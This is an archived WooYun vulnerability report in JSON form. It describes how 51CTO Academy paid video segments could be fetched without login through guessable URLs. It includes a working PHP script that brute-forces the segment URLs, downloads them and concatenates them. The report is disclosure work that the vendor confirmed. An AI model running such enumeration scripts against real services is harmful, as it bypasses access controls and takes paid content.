{"id": 50482, "wybug_id": "wooyun-2014-077703", "wybug_title": "51CTO学院视频或可被爆破", "wybug_corp": "51CTO技术网站", "wybug_author": "Rain", "wybug_date": "2014-09-29 10:57", "wybug_open_date": "2014-11-13 10:58", "wybug_type": "未授权访问/权限绕过", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏认证"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-13：\t细节向公众公开  简要描述： 最近无意间发现51CTO推出了51cto学院视频。感觉挺不错的，所以就去看看。发现视频的规则和权限设置不当，或可被爆破，无需付金币 详细说明：  最近无意间发现51CTO推出了51cto学院视频。感觉挺不错的，所以就去看看。发现视频的规则和权限设置不当，或可被爆破，无需付金币   漏洞证明：  简单的看了几个视频对应的URL地址，发现了一些规律性的东西，比如说下面的地址http://v1.51cto.com/2014/07/25/33923/general/loco_video_203000_2.ts首先确认了，不需要登录就可以下载了。所以说明没有做任何权限判断和过滤，至于ts应该是视频的一个个片段。2014/07/25这个一看就是发布这个课程的时间。33923就是课程的ID。然后后面就有点雷同了。203000，经过研究发现，大部分情况，后面三个都是0.前面是一个三位数，代表什么意思不知道。但是好像都不会超过400.后面的_2.ts代表的是视频的片段2.经过这样的分析，如果我们手动尝试爆破，肯定就很费事。于是写了一个php脚本测试。还真可以获取成功。说明一种爆破的可能性，代码如下，仅供学习参考\n<?php//lesson id$id = '31465';//lesson publish year$year = '2014';//lesson publish month $month = '07';//lesson publish  day$day = '14';if (is_dir('tmp'))\trrmdir('tmp');$split_cmd = '';for ($j = 100; $j < 4000; $j  ){\t$url = 'http://v1.51cto.com/'.$year.'/'.$month.'/'.$day.'/'.$id.'/general/loco_video_'.$j.'000_0.ts';\t$arr = get_headers($url);\techo 'test url: ',$url,PHP_EOL;\tif ($arr[0] != 'HTTP/1.0 200 OK')\t\tcontinue;\techo 'have fun, we find video',PHP_EOL;\tsleep(3);\tfor ($i = 0; $i < 1000; $i  )\t{\t\t$url = 'http://v1.51cto.com/'.$year.'/'.$month.'/'.$day.'/'.$id.'/general/loco_video_'.$j.'000_'.$i.'.ts';\t\t$arr = get_headers($url);\t\tif ($arr[0] == 'HTTP/1.0 200 OK')\t\t{\t\t\techo $url,PHP_EOL;\t\t\tif (!is_dir('tmp'))\t\t\t\tmkdir('tmp');\t\t\tfile_put_contents('tmp/'.$i.'.ts', file_get_contents($url));\t\t\t$split_cmd .= $i.'.ts ';\t\t}\t\telse\t\t{\t\t\techo 'all video split download finish, see result.ts',PHP_EOL;\t\t\tbreak 2;\t\t}\t}}if (!is_dir('tmp'))\techo 'sorry, video not find';else{\t$cmd = 'cd tmp && copy /b '.substr($split_cmd, 0, -1).' result.ts';\techo 'execute command: ',$cmd,PHP_EOL;\texec($cmd);}function rrmdir($dir) {     foreach(glob($dir . '/*') as $file) {         if(is_dir($file))             rrmdir($file);         else             unlink($file);     }     rmdir($dir);}\n测试结果\n\n   修复方案：  你懂得   版权声明：转载请注明来源 Rain@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-09-29 14:40 厂商回复： 感谢白帽子的关注，51CTO学院视频文件文件本身是被加密的，即使被下载也无法直接观看。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}